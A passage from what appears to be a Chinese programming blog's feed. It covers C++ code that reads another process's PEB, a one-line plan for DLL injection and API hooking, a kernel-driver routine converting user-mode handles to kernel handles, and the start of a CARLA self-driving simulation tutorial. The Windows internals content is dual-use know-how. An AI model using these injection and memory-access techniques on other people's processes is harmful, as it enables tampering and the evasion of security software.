std::hex &lt;&lt; pbi.PebBaseAddress &lt;&lt; std::endl;</span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;Ldr:&quot; &lt;&lt; hex &lt;&lt; Peb-&gt;Ldr &lt;&lt; endl;</span></span><br><span class="line">            <span class="comment">//cout &lt;&lt; &quot;ImageBaseAddress:&quot; &lt;&lt; hex &lt;&lt; Peb-&gt;ImageBaseAddress &lt;&lt; endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 目标 32位，自身 32位</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (bTarget == TRUE &amp;&amp; bSource == TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        HMODULE NtdllModule = <span class="built_in">GetModuleHandle</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">        pfnNtQueryInformationProcess NtQueryInformationProcess = (pfnNtQueryInformationProcess)<span class="built_in">GetProcAddress</span>(NtdllModule,<span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line">        PROCESS_BASIC_INFORMATION32 pbi = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        UINT32  ReturnLength = <span class="number">0</span>;</span><br><span class="line">        NTSTATUS Status = <span class="built_in">NtQueryInformationProcess</span>(m_ProcessHandle,ProcessBasicInformation,&amp;pbi,(UINT32)<span class="built_in">sizeof</span>(pbi),(UINT32*)&amp;ReturnLength);</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status))&#123;</span><br><span class="line">            _PEB32* Peb = (_PEB32*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(_PEB32));</span><br><span class="line">            <span class="built_in">ReadProcessMemory</span>(m_ProcessHandle, (PVOID)pbi.PebBaseAddress,(_PEB32*)Peb,<span class="built_in">sizeof</span>(_PEB32),<span class="literal">NULL</span>);</span><br><span class="line">           </span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;PEB地址:&quot;</span> &lt;&lt; std::hex &lt;&lt; pbi.PebBaseAddress &lt;&lt; std::endl;</span><br><span class="line">            <span class="comment">//printf(&quot;LdrAddress:%x\r\n&quot;, ((_PEB32*)Peb)-&gt;Ldr);</span></span><br><span class="line">            <span class="comment">//printf(&quot;ImageBaseAddress:%x\r\n&quot;, ((_PEB32*)Peb)-&gt;ImageBaseAddress);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="4-注入"><a href="#4-注入" class="headerlink" title="4. 注入"></a>4. 注入</h1><p>对目标进程进行DLL注入，Hook <code>GetMoudleHandle</code>、<code>Loadlibary</code>等函数，让目标进程自己调用，进行IPC通信。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb">PEB （winternl.h） - Win32 应用 |Microsoft 学习</a></p><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data">PEB_LDR_DATA （winternl.h） - Win32 应用 |Microsoft 学习</a></p><p><a href="https://www.cnblogs.com/bokernb/p/6404795.html">PEB及LDR链 - bokernb - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/lunatic7/article/details/124460261">远程获取进程DLL模块地址_获取进程模块-CSDN博客</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot">CreateToolhelp32Snapshot 函数 (tlhelp32.h) - Win32 apps | Microsoft Learn</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/psapi/enumerating-all-modules-for-a-process">枚举进程的所有模块 - Win32 apps | Microsoft Learn</a></p>]]></content>
      
      
      <categories>
          
          <category> Windows Programming </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>目标进程用户模式句柄转换为内核句柄</title>
      <link href="/2024/02/04/%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F%E5%8F%A5%E6%9F%84%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%86%85%E6%A0%B8%E5%8F%A5%E6%9F%84/"/>
      <url>/2024/02/04/%E7%9B%AE%E6%A0%87%E8%BF%9B%E7%A8%8B%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F%E5%8F%A5%E6%9F%84%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%86%85%E6%A0%B8%E5%8F%A5%E6%9F%84/</url>
      
        <content type="html"><![CDATA[<h1 id="目标进程用户模式句柄转换为内核句柄"><a href="#目标进程用户模式句柄转换为内核句柄" class="headerlink" title="目标进程用户模式句柄转换为内核句柄"></a>目标进程用户模式句柄转换为内核句柄</h1><p>网上很多方法都是Ring0内核进程和句柄互相转换的方法，查了一下没怎么看到说怎么将用户模式句柄转换为内核句柄的。如果内核获取到的是<strong>目标进程的句柄</strong>，拷贝到内核模式是不能直接使用的，会引发异常。</p><p>目前想到的实现思路是：</p><ol><li>如果是伪句柄，直接返回后面再来处理。</li><li>调用<code>ObReferenceObjectByHandle</code>指定用户模式句柄获取任意对象的体指针  （EProcess、EThread ）</li><li>调用<code>ObOpenObjectByPointer</code>打开指针所引用的对象，并返回对象的句柄，此时设置为内核句柄。就获取到啦。</li></ol><p>本人是菜鸟，各位师傅如果知道其他的方法跪求指点！！！</p><p>实现代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS <span class="title function_">ConvertKernelHandle</span><span class="params">(</span></span><br><span class="line"><span class="params">    IN HANDLE    UserHandle,</span></span><br><span class="line"><span class="params">    OUT PHANDLE  KernelHandle,</span></span><br><span class="line"><span class="params">    POBJECT_TYPE ObjectType</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line">    PVOID    Object = <span class="literal">NULL</span>;   <span class="comment">//任意对象的体指针  EProcess   EThread  </span></span><br><span class="line">    LONG     v1 = (LONG)UserHandle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (KernelHandle == <span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        Status = STATUS_INVALID_PARAMETER;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (v1 &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        *KernelHandle = UserHandle;</span><br><span class="line">        Status = STATUS_SUCCESS;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Status = ObReferenceObjectByHandle(</span><br><span class="line">        UserHandle,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        ObjectType,</span><br><span class="line">        UserMode,</span><br><span class="line">        &amp;Object,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Status != STATUS_SUCCESS) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Status = ObOpenObjectByPointer(</span><br><span class="line">        Object,</span><br><span class="line">        OBJ_KERNEL_HANDLE,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        KernelMode,</span><br><span class="line">        KernelHandle</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*KernelHandle == UserHandle) &#123;</span><br><span class="line">        Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line">    <span class="keyword">if</span> (Object != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ObDereferenceObject(Object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪句柄转换为真实句柄，可以调用复制对象句柄的<code>DuplicateHandle</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DuplicateHandle</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE   hSourceProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE   hSourceHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  HANDLE   hTargetProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out] LPHANDLE lpTargetHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD    dwDesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  BOOL     bInheritHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  DWORD    dwOptions</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>微软官方在对此函数的解释中，说明了如果 <em>hSourceHandle</em> 是伪句柄， 会将其转换为进程或线程的实际句柄。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/ntifs/nf-ntifs-obopenobjectbypointer">ObOpenObjectByPointer 函数 (ntifs.h) - Windows drivers | Microsoft Learn</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/nf-wdm-obreferenceobjectbyhandle">ObReferenceObjectByHandle 函数 (wdm.h) - Windows drivers | Microsoft Learn</a></p><p><a href="https://learn.microsoft.com/zh-cn/windows/win32/api/handleapi/nf-handleapi-duplicatehandle">DuplicateHandle 函数 (handleapi.h) - Win32 apps | Microsoft Learn</a></p><p><a href="https://www.cnblogs.com/lsh123/p/7350496.html">伪句柄转换为真正的句柄 - 沉疴 - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>基于CALRA和DQN实现自动驾驶的仿真</title>
      <link href="/2024/02/04/%E5%9F%BA%E4%BA%8ECALRA%E5%92%8CDQN%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E7%9A%84%E4%BB%BF%E7%9C%9F/"/>
      <url>/2024/02/04/%E5%9F%BA%E4%BA%8ECALRA%E5%92%8CDQN%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E7%9A%84%E4%BB%BF%E7%9C%9F/</url>
      
        <content type="html"><![CDATA[<h1 id="基于carla与DQN实现自动驾驶的仿真"><a href="#基于carla与DQN实现自动驾驶的仿真" class="headerlink" title="基于carla与DQN实现自动驾驶的仿真"></a>基于carla与DQN实现自动驾驶的仿真</h1><hr><h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1. 安装"></a>1. 安装</h2><h3 id="1-1-配置虚拟环境"><a href="#1-1-配置虚拟环境" class="headerlink" title="1.1 配置虚拟环境"></a>1.1 配置虚拟环境</h3><p>在anaconda prompt逐条运行下面命令，单独配置虚拟环境。car是名字，可以自己取，但是python必须是3.7。创建好后使用pip命令下载配置所有的库（方便换源，conda换源不太方便）。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">conda create -n car python=3.7</span><br><span class="line">conda activate car</span><br><span class="line">pip install carla,pygame,numpy</span><br></pre></td></tr></table></figure><h3 id="1-2-配置carla模拟器"><a href="#1-2-配置carla模拟器" class="headerlink" title="1.2 配置carla模拟器"></a>1.2 配置carla模拟器</h3><p><a href="http://carla.org/">CARLA Simulator</a> 点击进入官网，可以查看版本信息与官方文档。官方文档是我们学习的基础。下载模拟器时，应该进入官网查看最新版本，再前往carla的github主页进行下载，确保下载的是最新版本。因为<strong>只有最新版本的carla能通过pip命令安装依赖库，其他版本的安装非常繁琐（在下面第三大点有详细描述）。版本错误程序会直接崩溃。</strong><a href="https://github.com/carla-simulator/carla/releases">Releases · carla-simulator&#x2F;carla (github.com)</a> 根据版本下载对应的压缩包或使用git命令克隆下来。注意carla<strong>只支持Linux的乌班图系统和windows系统，不支持mac系统，</strong>mac用户使用虚拟机下载。</p><p><img src="/.io//image-20220713130421654.png" alt="image-20220713130421654"></p><p><img src="/.io//image-20220713130434214.png" alt="image-20220713130434214"></p><h3 id="1-3-仿真环境初体验"><a href="#1-3-仿真环境初体验" class="headerlink" title="1.3 仿真环境初体验"></a>1.3 仿真环境初体验</h3><p>解压下载好的压缩包，运行CarlaUE4.exe。windows可能会报“发布者未知”，这里点击信任，或直接关闭防火墙。carla的内核是虚幻4，需要较高的配置支持，首次启动请等待片刻。进去后是这样的画面：</p><p><img src="/.io//image-20220713131330156.png" alt="image-20220713131330156"></p><p>carla有好几个地图，还可以下载地图拓展，这里是默认的一号地图，后面可以在代码中修改。使用wasd键控制前后左右，按住鼠标中键可以转换视角，细看城市中的内容。后面可以在代码中修改地图。</p><p>使用conda命令窗口，激活car环境，使用cd命令转到WindowsNoEditor\PythonAPI\examples，使用python manual_control.py命令运行这个代码，可以得到一辆车，自由操控，使用Back键还能换别的来玩。</p><p>即使是这样，城市也非常空旷。接下来我们来看看如何使用carla进行自动驾驶的仿真。</p><h2 id="2-CARLA-Simulator的核心概念"><a href="#2-CARLA-Simulator的核心概念" class="headerlink" title="2. CARLA Simulator的核心概念"></a>2. CARLA Simulator的核心概念</h2><h3 id="2-1-客户端"><a href="#2-1-客户端" class="headerlink" title="2.1  客户端"></a>2.1  客户端</h3><h4 id="2-1-1客户端"><a href="#2-1-1客户端" class="headerlink" title="2.1.1客户端"></a>2.1.1客户端</h4><p>客户端是 CARLA 架构中的主要元素之一。 它们连接到服务器、检索信息和命令更改。 这是通过脚本完成的。 客户端识别自己，并连接到世界，然后使用模拟进行操作。</p><p>除此之外，客户还可以访问高级 CARLA 模块、功能和应用命令批处理。 本节仅介绍命令批处理。 这些对于生成大量actors之类的基本事物很有用。 其余功能更为复杂，将在各自页面的高级步骤中进行介绍。</p><p>查看 Python API 参考中的 carla.Client 以了解该类的特定方法和变量。</p><h4 id="2-1-2-客户端的创建"><a href="#2-1-2-客户端的创建" class="headerlink" title="2.1.2 客户端的创建"></a>2.1.2 客户端的创建</h4><p>使用carla.Client方法创建。需要三个参数，标识它的 IP 地址，以及用于与服务器通信的两个 TCP 端口。可选的第三个参数设置工作线程的数量。 默认情况下，这设置为全部 (0)。默认情况下，CARLA 使用本地主机 IP 和端口 2000 进行连接，但这些可以随意更改。 在这种情况下，第二个端口将始终为 n+1, 2001。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client = carla.Client(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">2000</span>)</span><br></pre></td></tr></table></figure><h4 id="2-1-3-设置客户端超时时间"><a href="#2-1-3-设置客户端超时时间" class="headerlink" title="2.1.3 设置客户端超时时间"></a>2.1.3 设置客户端超时时间</h4><p>创建客户端后，使用set_timeout方法设置其超时时间。 这限制了所有网络操作，因此这些操作不会永远阻塞客户端。 如果连接失败，将返回错误。</p><p>可以连接多个客户端，因为一次运行多个脚本是很常见的。</p><p>超时时间以秒为单位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client.set_timeout(<span class="number">10.0</span>)</span><br></pre></td></tr></table></figure><h4 id="2-1-4-检查版本"><a href="#2-1-4-检查版本" class="headerlink" title="2.1.4 检查版本"></a>2.1.4 检查版本</h4><p>客户端和服务器具有不同的 libcarla 模块。 如果版本不同，可能会出现问题。 这可以使用 get_client_version() 和 get_server_version() 方法进行检查。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(client.get_client_version())</span><br><span class="line"><span class="built_in">print</span>(client.get_server_version())</span><br></pre></td></tr></table></figure><h4 id="2-1-5虚拟世界连接"><a href="#2-1-5虚拟世界连接" class="headerlink" title="2.1.5虚拟世界连接"></a>2.1.5虚拟世界连接</h4><p>客户端可以相当轻松地连接和检索当前世界。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">world = client.get_world()</span><br></pre></td></tr></table></figure><p>客户端还可以获取可用地图列表来更改当前地图。 这将摧毁当前的世界并创造一个新的世界。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(client.get_available_maps())</span><br><span class="line">...</span><br><span class="line">world = client.load_world(<span class="string">&#x27;Town01&#x27;</span>)</span><br><span class="line"><span class="comment"># client.reload_world() creates a new instance of the world with the same map. </span></span><br></pre></td></tr></table></figure><p>每个世界对象都有一个 ID 或形象地称作“情节”。 每次客户端调用 load_world() 或 reload_world() 时，前一个都会被销毁。 新的“情节”是从头开始创建的。 在此过程中不会重新启动虚幻引擎。</p><h4 id="2-1-6-运行命令"><a href="#2-1-6-运行命令" class="headerlink" title="2.1.6 运行命令"></a>2.1.6 运行命令</h4><p>命令是对一些最常见的 CARLA 方法的改编，可以批量应用。 例如，command.SetAutopilot 等价于 Vehicle.set_autopilot()，为车辆启用自动驾驶仪。 但是，使用 Client.apply_batch() 或 Client.apply_batch_sync() 方法，可以在一个模拟步骤中应用一系列命令。 这对于通常应用于甚至数百个元素的方法变得非常有用。</p><p>以下示例使用批处理一次性销毁车辆列表。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">client.apply_batch([carla.command.DestroyActor(x) <span class="keyword">for</span> x <span class="keyword">in</span> vehicles_list])</span><br></pre></td></tr></table></figure><p>因此我们后面创建actors时，会开一个列表来存放方便销毁。</p><h4 id="2-1-7-其他客户端实用程序"><a href="#2-1-7-其他客户端实用程序" class="headerlink" title="2.1.7 其他客户端实用程序"></a>2.1.7 其他客户端实用程序</h4><p>客户端对象的主要目的是获取或改变世界，并应用命令。 但是，它还提供对一些附加功能的访问。</p><ul><li>交通管理模块：该模块负责每辆设置为自动驾驶的车辆，以重建城市交通。</li><li>录像模块：允许重新制定以前的模拟。 通过录像快照来总结每帧的模拟状态。</li></ul><p>后面会重新提及。</p><h3 id="2-2-虚拟世界"><a href="#2-2-虚拟世界" class="headerlink" title="2.2 虚拟世界"></a>2.2 虚拟世界</h3><h4 id="2-2-1-虚拟世界"><a href="#2-2-1-虚拟世界" class="headerlink" title="2.2.1 虚拟世界"></a>2.2.1 虚拟世界</h4><p>模拟测试的主要部分。 它的实例应该由客户端检索。 它不包含世界本身的模型，它是 Map 类的一部分。 相反，可以从此类访问大部分信息和常规设置。</p><ul><li>模拟中的参与者和旁观者</li><li>蓝图库</li><li>地图</li><li>模拟设置</li><li>快照</li><li>天气和灯光管理器</li></ul><p>它的一些最重要的方法是 getter，精确地检索这些元素的信息或实例。 查看 carla.World 以了解更多信息。、</p><p>carla.World PythonAPI reference：</p><ul><li><p>Instance Variables</p></li><li><ul><li>id (int)：与这个世界关联的 episode 的 id<ul><li>debug (carla.DebugHelper)：负责创建不同的 shapes for debugging</li></ul></li></ul></li><li><p>Methods</p></li><li><ul><li>apply_settings：将 carla.WorldSettings 对象包含的设置应用于仿真，并返回实现他们的帧 id<ul><li>cast_ray：将射线从指定的 initial_location 投射到 final_location，检测与射线相交的所有几何体，并按顺序返回到 carla.LabelledPoint 列表</li><li>enable_environment_objects：启用或禁用由 id 标识的一组 EnvironmentObject。这些对象将在关卡中显示或消失</li><li>freeze_all_traffic_lights：冻结或解冻场景中所有的交通信号灯</li><li>ground_projection：将指定的点向下 (0,0,-1) 投射到场景中，并返回 carla.Labelled 对象，这个对象是与射线相交的第一个几何体（通常是地面）</li><li>load_map_layer：将选定的图层加载到关卡</li><li>on_tick：此方法用于异步模式，从客户端启用传入的回调 callback</li><li>project_point：将指定的点投影到场景中的所需方向</li><li>remove_on_tick：停止从 on_tick 开始的 callback_id 的回调</li><li>reset_all_traffic_lights：将地图中所有交通信号灯的周期重置为初始状态</li><li>spawn_actor：在世界中创建 Actor</li><li>tick：此方法用于同步模式，发从 tick 给 server，返回服务器计算好的新 id</li><li>try_spawn_actor：与 spawn_actor，但失败使返回 None 而不是异常</li><li>unload_map_layer：将选定的图层卸载</li><li>wait_for_tick：此方法用于异步模式，使客户端等服务器 tick</li></ul></li></ul></li><li><p>Getters</p></li><li><ul><li>get_actor：通过 id 查找 Actor，如果没找到返回 None<ul><li>get_actors：检索 carla.Actor 列表，使用提供的 id 列表返回所有的 Actor</li><li>get_blueprint_library：返回可以在世界中创建的 Actor 列表</li><li>get_environment_objects：返回带有请求的语义的 EnvironmentObject 列表</li><li>get_level_bbs：返回在世界空间中具有位置和渲染的边界框数组</li><li>get_lightmanager：返回 carla.LightManager 的实例，该实例可用于处理场景中的灯光</li><li>get_map：像服务器查询包含地图文件的 XDOR，将其解析为 carla.Map 并返回</li><li>get_random_location_form_navigation：只能和行人一起使用。检索被用作目的地的随机位置 go_to_location 的 carla.WalkerAIController</li><li>get_settings：返回一个包含仿真数据的对象，例如客户端和服务器之间同步或渲染模式</li><li>get_snapshot：返回某个时刻的世界快照，包括有关参与者的所有信息</li><li>get_spectator：返回观察者。观察者用来作为相机，并控制仿真窗口中的视图</li><li>get_traffic_light：提供一个 landmark，返回他描述的交通灯对象</li><li>get_traffic_sign：提供一个 landmark，返回他描述的交通标志对象</li><li>get_vehicles_light_states：返回一个字典，他的 key 是 carla.Actor id，value 是 carla.VehicleLightState</li><li>get_weather：检索一个对象，该对象包含当前仿真的天气参数，主要是 云、雨、风和太阳的位置</li></ul></li></ul></li><li><p>Setters</p></li><li><ul><li>set_weather：设定天气</li></ul></li><li><p>Dunder methods</p></li><li><ul><li><code>__str__</code>：解析并打印世界内容，作为其当前状态的简要报告</li></ul></li></ul><h4 id="2-2-2-元素"><a href="#2-2-2-元素" class="headerlink" title="2.2.2 元素"></a>2.2.2 元素</h4><p>世界有不同的方法，这与允许不同功能的“参与者”相关。</p><ul><li>生成actors（但不破坏它们）</li><li>让每个元素都在现场，或者特别找一个</li><li>访问蓝图库</li><li>访问旁观者视角</li><li>检索适合生成元素的随机位置。</li></ul><p>actors就是“演员”，代表着世界里可以移动的物体，包括汽车，传感器（因为传感器要安在车身上）以及行人。</p><h4 id="2-2-3-天气"><a href="#2-2-3-天气" class="headerlink" title="2.2.3 天气"></a>2.2.3 天气</h4><p>天气本身不是一个类，而是一组可从世界访问的参数。 参数化包括太阳方向、云量、风、雾等等。 辅助类 carla.WeatherParameters 用于定义自定义天气。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">weather = carla.WeatherParameters(</span><br><span class="line">    cloudiness=<span class="number">80.0</span>,</span><br><span class="line">    precipitation=<span class="number">30.0</span>,</span><br><span class="line">    sun_altitude_angle=<span class="number">70.0</span>)</span><br><span class="line"></span><br><span class="line">world.set_weather(weather)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(world.get_weather())</span><br></pre></td></tr></table></figure><p>有一些天气预设可以直接应用于世界。 这些在 carla.WeatherParameters 中列出，并可作为枚举访问。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">world.set_weather(carla.WeatherParameters.WetCloudySunset)</span><br></pre></td></tr></table></figure><p>天气也可以使用 CARLA 提供的两个脚本进行自定义。</p><ul><li><strong><code>environment.py</code></strong> <em>(in <code>PythonAPI/util</code>)</em> — 提供对天气和灯光参数的访问，以便实时更改这些参数。</li></ul><p>environment.py中的可选参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-h, --help            show this help message and exit</span><br><span class="line">--host H              IP of the host server (default: 127.0.0.1)</span><br><span class="line">-p P, --port P        TCP port to listen to (default: 2000)</span><br><span class="line">--sun SUN             Sun position presets [sunset | day | night]</span><br><span class="line">--weather WEATHER     Weather condition presets [clear | overcast | rain]</span><br><span class="line">--altitude A, -alt A  Sun altitude [-90.0, 90.0]</span><br><span class="line">--azimuth A, -azm A   Sun azimuth [0.0, 360.0]</span><br><span class="line">--clouds C, -c C      Clouds amount [0.0, 100.0]</span><br><span class="line">--rain R, -r R        Rain amount [0.0, 100.0]</span><br><span class="line">--puddles Pd, -pd Pd  Puddles amount [0.0, 100.0]</span><br><span class="line">--wind W, -w W        Wind intensity [0.0, 100.0]</span><br><span class="line">--fog F, -f F         Fog intensity [0.0, 100.0]</span><br><span class="line">--fogdist Fd, -fd Fd  Fog Distance [0.0, inf)</span><br><span class="line">--wetness Wet, -wet Wet</span><br><span class="line">                      Wetness intensity [0.0, 100.0]</span><br></pre></td></tr></table></figure><ul><li><strong><code>dynamic_weather.py</code></strong> <em>(in <code>PythonAPI/examples</code>)</em> — 启用开发人员为每个 CARLA 地图准备的特定天气周期。</li></ul><p>dynamic_weather.py的可选参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-h, --help            show this help message and exit</span><br><span class="line">--host H              IP of the host server (default: 127.0.0.1)</span><br><span class="line">-p P, --port P        TCP port to listen to (default: 2000)</span><br><span class="line">-s FACTOR, --speed FACTOR</span><br><span class="line">                      rate at which the weather changes (default: 1.0)</span><br></pre></td></tr></table></figure><p><strong>天气的变化不会影响世界中的车辆的物理性质。 它们只是相机传感器可以捕捉到的视觉效果。当 sun_altitude_angle &lt; 0 时，夜间模式开始，这被认为是日落。 这是灯光变得特别重要的时候。世界中路灯会自动打开。</strong></p><h4 id="2-2-4-光线"><a href="#2-2-4-光线" class="headerlink" title="2.2.4 光线"></a>2.2.4 光线</h4><p>路灯有这些相关类：</p><ul><li>carla.Light：地图开发者放置的 lights，通过 carla.Light 对象访问</li><li>carla.LightState：颜色和强度等属性，在 light_state 中设置</li><li>carla.LightGroup：使用 light_group 进行分类，例如 路灯、建筑物灯…</li><li>carla.LightManager：可以在一个调用中被检索来处理一组灯光</li></ul><p>当模拟进入夜间模式时，路灯会自动打开。 灯光由地图的开发人员放置，并可作为 carla.Light 对象访问。 颜色和强度等属性可以随意更改。 carla.LightState 类型的变量 light_state 允许在一次调用中设置所有这些。<br>路灯使用 carla.LightGroup 类型的属性 light_group 进行分类。 这允许将灯分类为路灯、建筑灯…… carla.LightManager 的一个实例可以被检索以在一次调用中处理灯组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Get the light manager and lights</span></span><br><span class="line">lmanager = 